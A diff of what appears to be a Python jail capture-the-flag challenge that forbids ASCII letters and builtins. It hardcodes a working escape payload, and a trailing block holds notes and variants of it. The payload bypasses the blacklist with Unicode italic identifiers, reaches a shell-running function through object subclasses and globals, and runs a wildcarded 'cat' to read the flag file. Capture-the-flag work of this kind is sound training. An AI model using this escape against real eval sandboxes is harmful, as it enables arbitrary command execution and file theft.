@@ -42,26 +42,58 @@ banner = """
   Given a limited character set and limited execution, try to read "flag.txt" from the system!
 """
 
-# no letters for you!!!
+# No opening files for you!
+open = None
+
+# and no letters for you!!!
 def is_allowed(your_code):
   blacklist = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") 
   for c in your_code:
      if c in blacklist: 
+        print("C failed", c)
         return False
   return True
 
 MAX_CODE_SIZE = 300
 def jail3():
     print("You made it here? Fine, I guess i'll just remove the entire alphabet from you...")
+    print("You get 15 characters only this time")
     your_code = input("> ")
+
+
+    your_code = """[*[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][6].𝘷𝘢𝘭𝘶𝘦𝘴()][42]([*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]("{} ./????.???".𝘧𝘰𝘳𝘮𝘢𝘵(().__𝘥𝘰𝘤__[-3] + ().__𝘥𝘰𝘤__[-11] + ().__𝘥𝘰𝘤__[-2])).𝘳𝘦𝘢𝘥())"""
     if(len(your_code) > MAX_CODE_SIZE):
         print("nope nope nope nope, too many characters: ", len(your_code))
     elif not is_allowed(your_code):
        print("no alphabet allowed!")
     else:
-      print(f"not bad, no alphabet, and only {len(your_code)} characters, but how will you do without any builtins?")
+      print(f"Your code has {len(your_code)} characters, go ahead and run it")
+
+      # Whatever, I'll just delete all the builtins!
+
+      
       eval(your_code, {"__builtins__": {}})
 
 if __name__ == "__main__":
     print(banner)
     jail3()
+
+
+
+"""
+𝔪𝔶_𝔢𝔳𝔞𝔩(𝔦𝔫𝔭𝔲𝔱())
+𝔪𝔶_𝔢𝔳𝔞𝔩("1+1")
+
+ｅｖａｌ(ｉｎｐｕｔ())
+ｍｙ_ｅｖａｌ("1+1")
+𝚙𝚛𝚒𝚗𝚝(3)
+>>> for x,y in enumerate([*().__class__.__base__.__subclasses__()[140].__init__.__globals__.items()]): print(x,str(y)) 
+
+[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]("{} ./????.???".𝘧𝘰𝘳𝘮𝘢𝘵(().__𝘥𝘰𝘤__[-3] + ().__𝘥𝘰𝘤__[-11] + ().__𝘥𝘰𝘤__[-2])).𝘳𝘦𝘢𝘥()
+
+# to get print
+[*[*().__class__.__base__.__subclasses__()[140].__init__.__globals__.values()][6].values()][42]
+[*[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][6].values()][42]([*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]("{} ./????.???".𝘧𝘰𝘳𝘮𝘢𝘵(().__𝘥𝘰𝘤__[-3] + ().__𝘥𝘰𝘤__[-11] + ().__𝘥𝘰𝘤__[-2])).𝘳𝘦𝘢𝘥())
+
+[*().__class__.__base__.__subclasses__()[140].__init__.__globals__.items()][6][1]['print']([*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]("{} ./????.???".𝘧𝘰𝘳𝘮𝘢𝘵(().__𝘥𝘰𝘤__[-3] + ().__𝘥𝘰𝘤__[-11] + ().__𝘥𝘰𝘤__[-2])).𝘳𝘦𝘢𝘥())
+"""
